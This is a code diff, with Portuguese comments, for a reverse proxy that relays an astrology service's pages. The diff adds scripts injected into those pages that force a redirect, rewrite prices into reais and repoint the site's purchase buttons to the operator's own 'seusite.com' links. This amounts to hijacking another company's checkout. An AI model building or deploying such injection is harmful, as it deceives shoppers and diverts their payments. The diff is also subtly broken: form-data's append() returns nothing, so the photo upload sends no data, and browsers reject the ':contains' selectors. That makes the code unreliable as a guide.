@@ -15,8 +15,8 @@ const MAIN_TARGET_URL = 'https://appnebula.co';
 const READING_SUBDOMAIN_TARGET = 'https://reading.nebulahoroscope.com';
 
 // Configurações para Modificação de Conteúdo
-const USD_TO_BRL_RATE = 5.00;
-const CONVERSION_PATTERN = /\$(\d+(\.\d{2})?)/g; // Manter para outras possíveis conversões genéricas
+const USD_TO_BRL_RATE = 5.00; // Manter a taxa para cálculos no cliente
+// A CONVERSION_PATTERN não será mais usada para substituições no lado do servidor aqui
 
 // Usa express-fileupload para lidar com uploads de arquivos (multipart/form-data)
 app.use(fileUpload({
@@ -62,29 +62,11 @@ app.use(async (req, res) => {
     const targetUrl = `${targetDomain}${requestPath}`;
 
     try {
-        let requestData = req.body;
-
-        if (req.files && Object.keys(req.files).length > 0) {
-            const photoFile = req.files.photo;
-
-            if (photoFile) {
-                const formData = new (require('form-data'))();
-                formData.append('photo', photoFile.data, {
-                    filename: photoFile.name,
-                    contentType: photoFile.mimetype,
-                });
-                requestData = formData;
-                delete requestHeaders['content-type'];
-                delete requestHeaders['content-length'];
-                Object.assign(requestHeaders, formData.getHeaders());
-            }
-        }
-
         const response = await axios({
             method: req.method,
             url: targetUrl,
             headers: requestHeaders,
-            data: requestData,
+            data: req.files && req.files.photo ? new (require('form-data'))().append('photo', req.files.photo.data, { filename: req.files.photo.name, contentType: req.files.photo.mimetype }) : req.body,
             responseType: 'arraybuffer',
             maxRedirects: 0,
             validateStatus: function (status) {
@@ -222,12 +204,10 @@ app.use(async (req, res) => {
 
             // ---
             // REDIRECIONAMENTO CLIENT-SIDE MAIS AGRESSIVO PARA /pt/witch-power/email
-            // Este script será injetado em TODAS as páginas HTML para forçar o redirecionamento
             $('head').append(`
                 <script>
                     console.log('CLIENT-SIDE REDIRECT SCRIPT: Initializing.');
-
-                    let redirectCheckInterval; // Variável para armazenar o ID do intervalo
+                    let redirectCheckInterval;
 
                     function handleEmailRedirect() {
                         const currentPath = window.location.pathname;
@@ -243,52 +223,128 @@ app.use(async (req, res) => {
                     document.addEventListener('DOMContentLoaded', handleEmailRedirect);
                     window.addEventListener('popstate', handleEmailRedirect);
                     redirectCheckInterval = setInterval(handleEmailRedirect, 100);
-
                     window.addEventListener('beforeunload', () => {
                         if (redirectCheckInterval) {
                             clearInterval(redirectCheckInterval);
                         }
                     });
-
-                    handleEmailRedirect(); // Tenta executar imediatamente também
-
+                    handleEmailRedirect();
                 </script>
             `);
             // ---
 
-            // MODIFICAÇÕES ESPECÍFICAS PARA /pt/witch-power/trialChoice
+            // ---
+            // NOVO: MODIFICAÇÕES CLIENT-SIDE PARA /pt/witch-power/trialChoice (preços e textos)
+            // Este script será injetado e executado no navegador após o carregamento da página
             if (req.url.includes('/pt/witch-power/trialChoice')) {
-                console.log('Modificando conteúdo para /trialChoice (preços e textos).');
+                console.log('Injetando script de modificação de conteúdo para /trialChoice no lado do cliente.');
+                $('body').append(`
+                    <script>
+                        document.addEventListener('DOMContentLoaded', function() {
+                            console.log('CLIENT-SIDE CONTENT MOD: DOMContentLoaded para trialChoice.');
 
-                // Preços para os botões
-                const newButtonPrices = ['R$ 5', 'R$ 10', 'R$ 14', 'R$ 18,67'];
-                const trialButtons = $('button[data-testid="trial-choice-radio-button-label"]');
+                            const newButtonPrices = ['R$ 5', 'R$ 10', 'R$ 14', 'R$ 18,67'];
 
-                // Itera sobre os botões e define o texto explicitamente
-                trialButtons.each((index, element) => {
-                    if (newButtonPrices[index]) {
-                        $(element).text(newButtonPrices[index]);
-                        console.log(`Preço do botão ${index + 1} alterado para: ${newButtonPrices[index]}`);
-                    }
-                });
+                            // Função para aplicar as modificações
+                            function applyTrialChoiceModifications() {
+                                let changedSomething = false;
 
-                // Altera o texto do parágrafo específico
-                // Usando a classe e o conteúdo parcial para maior especificidade
-                $('p.sc-edafe909-6:contains("$13,67")').text('Apesar do nosso custo real ser de R$ 18,67*, por favor selecione um valor que você considere justo.');
-                console.log('Texto do parágrafo de custo real alterado.');
+                                // Modificar botões de preço
+                                const trialButtons = document.querySelectorAll('button[data-testid="trial-choice-radio-button-label"]');
+                                if (trialButtons.length > 0) {
+                                    trialButtons.forEach((button, index) => {
+                                        if (newButtonPrices[index] && button.textContent.includes('$')) { // Checa se ainda tem dólar para não reescrever
+                                            button.textContent = newButtonPrices[index];
+                                            console.log('CLIENT-SIDE CONTENT MOD: Botão de preço modificado: ' + newButtonPrices[index]);
+                                            changedSomething = true;
+                                        }
+                                    });
+                                }
 
-                // Outras modificações existentes
-                $('#buyButtonAncestral').attr('href', 'https://seusite.com/link-de-compra-ancestral-em-reais');
-                $('.cta-button-trial').attr('href', 'https://seusite.com/novo-link-de-compra-geral');
-                $('a:contains("Comprar Agora")').attr('href', 'https://seusite.com/meu-novo-link-de-compra-agora');
-                $('h2:contains("Trial Choice")').text('Escolha sua Prova Gratuita (Preços em Reais)');
-                $('p:contains("Selecione sua opção de teste")').text('Agora com preços adaptados para o Brasil!');
+                                // Modificar o parágrafo de custo real
+                                const costParagraph = document.querySelector('p.sc-edafe909-6');
+                                if (costParagraph && costParagraph.textContent.includes('$13,67')) {
+                                    costParagraph.textContent = 'Apesar do nosso custo real ser de R$ 18,67*, por favor selecione um valor que você considere justo.';
+                                    console.log('CLIENT-SIDE CONTENT MOD: Parágrafo de custo real modificado.');
+                                    changedSomething = true;
+                                }
+
+                                // Modificar outros textos se necessário
+                                const h2Title = document.querySelector('h2:contains("Trial Choice")'); // Cheerio-like selector might not work directly
+                                if (h2Title && h2Title.textContent.includes('Trial Choice')) {
+                                     h2Title.textContent = 'Escolha sua Prova Gratuita (Preços em Reais)';
+                                     console.log('CLIENT-SIDE CONTENT MOD: Título H2 modificado.');
+                                     changedSomething = true;
+                                }
+
+                                const pSelectOption = document.querySelector('p:contains("Selecione sua opção de teste")');
+                                if (pSelectOption && pSelectOption.textContent.includes('Selecione sua opção de teste')) {
+                                     pSelectOption.textContent = 'Agora com preços adaptados para o Brasil!';
+                                     console.log('CLIENT-SIDE CONTENT MOD: Parágrafo "Selecione sua opção" modificado.');
+                                     changedSomething = true;
+                                }
+
+                                // Modificar os atributos href dos botões (já está no seu código, só confirmando)
+                                // Estes seletores (ID/classe) devem funcionar no lado do cliente
+                                const buyButtonAncestral = document.getElementById('buyButtonAncestral');
+                                if (buyButtonAncestral) {
+                                    buyButtonAncestral.href = 'https://seusite.com/link-de-compra-ancestral-em-reais';
+                                    console.log('CLIENT-SIDE CONTENT MOD: buyButtonAncestral href modificado.');
+                                    changedSomething = true;
+                                }
+                                const ctaButtonTrial = document.querySelector('.cta-button-trial');
+                                if (ctaButtonTrial) {
+                                    ctaButtonTrial.href = 'https://seusite.com/novo-link-de-compra-geral';
+                                    console.log('CLIENT-SIDE CONTENT MOD: cta-button-trial href modificado.');
+                                    changedSomething = true;
+                                }
+                                const buyNowLink = document.querySelector('a:contains("Comprar Agora")');
+                                if (buyNowLink) {
+                                    // Acha o elemento 'a' que contém o texto "Comprar Agora" e modifica
+                                    buyNowLink.href = 'https://seusite.com/meu-novo-link-de-compra-agora';
+                                    console.log('CLIENT-SIDE CONTENT MOD: Link "Comprar Agora" href modificado.');
+                                    changedSomething = true;
+                                }
+
+                                return changedSomething;
+                            }
+
+                            // Tenta aplicar as modificações imediatamente
+                            applyTrialChoiceModifications();
+
+                            // Use um MutationObserver para detectar quando o conteúdo dinâmico é adicionado ou alterado
+                            // Isso é crucial para SPAs que renderizam conteúdo após o DOM inicial
+                            const observer = new MutationObserver(function(mutationsList, observer) {
+                                // Para cada mutação, verifique se as modificações foram aplicadas
+                                // E se sim, desconecte o observer para evitar loop e otimizar
+                                if (applyTrialChoiceModifications()) {
+                                    console.log('CLIENT-SIDE CONTENT MOD: Modificações aplicadas via MutationObserver. Desconectando.');
+                                    observer.disconnect(); // Desconecta após a primeira modificação bem-sucedida
+                                }
+                            });
+
+                            // Observa mudanças no body e seus descendentes
+                            observer.observe(document.body, { childList: true, subtree: true, characterData: true });
+
+                            // Fallback com setInterval, caso MutationObserver falhe em algum cenário específico
+                            let fallbackInterval = setInterval(function() {
+                                if (applyTrialChoiceModifications()) {
+                                    console.log('CLIENT-SIDE CONTENT MOD: Modificações aplicadas via fallback setInterval. Limpando.');
+                                    clearInterval(fallbackInterval);
+                                    observer.disconnect(); // Garante que o observer também pare
+                                }
+                            }, 200); // Tenta a cada 200ms
+
+                        }); // Fim do DOMContentLoaded
+                    </script>
+                `);
             }
+            // ---
 
             // MODIFICAÇÕES ESPECÍFICAS PARA /pt/witch-power/trialPaymentancestral
             if (req.url.includes('/pt/witch-power/trialPaymentancestral')) {
                 console.log('Modificando conteúdo para /trialPaymentancestral (preços e links de botões).');
-                // Aqui você pode aplicar a mesma lógica de substituição específica ou manter a regex
+                // Mantendo a lógica de servidor para esta página por enquanto, se não for SPA
                 $('body').html(function(i, originalHtml) {
                     return originalHtml.replace(CONVERSION_PATTERN, (match, p1) => {
                         const usdValue = parseFloat(p1);
